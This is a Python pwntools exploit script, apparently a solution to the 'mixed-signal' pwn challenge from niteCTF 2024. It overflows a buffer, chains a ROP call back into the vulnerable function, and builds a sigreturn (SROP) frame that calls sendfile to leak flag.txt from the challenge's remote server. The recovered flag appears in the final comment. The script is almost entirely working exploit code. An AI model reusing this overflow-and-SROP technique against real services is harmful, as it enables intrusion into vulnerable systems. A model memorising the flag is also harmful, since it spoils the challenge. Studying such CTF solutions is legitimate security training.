#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("mixed-signal.chals.nitectf2024.live", 1337, ssl=True)

rop = ROP(elf)
rop.raw(b"A" * 0x10)
rop.call("vuln")
rop.raw(p64(rop.find_gadget(['syscall']).address))

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_sendfile
frame.rdi = 1  # int out_fd / FILE_STDOUT
frame.rsi = 5  # int in_fd / open("flag.txt")
frame.rdx = 0  # off_t offset
frame.r10 = 64 # size_t count / too much / a guess
frame.rip = rop.find_gadget(['syscall']).address

rop.raw(bytes(frame))

p.sendlineafter(b"pickup!\n", rop.chain())

input()

p.sendline(b"A" * 14) # send 15 bytes total ~ vuln reads them and sets rax = 15/sigreturn

p.interactive() # nite{b0b'5_s1gn4ls_h4v3_b33N_retUrN3D}
